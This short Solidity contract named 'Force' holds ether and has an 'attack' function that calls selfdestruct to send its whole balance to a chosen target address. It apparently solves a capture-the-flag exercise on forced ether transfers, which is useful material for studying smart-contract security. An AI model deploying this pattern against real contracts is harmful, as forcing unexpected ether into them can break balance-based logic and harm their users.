// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    constructor() payable {}

    function attack(address target) external {
        selfdestruct(payable(target));
    }

    receive() external payable {}

}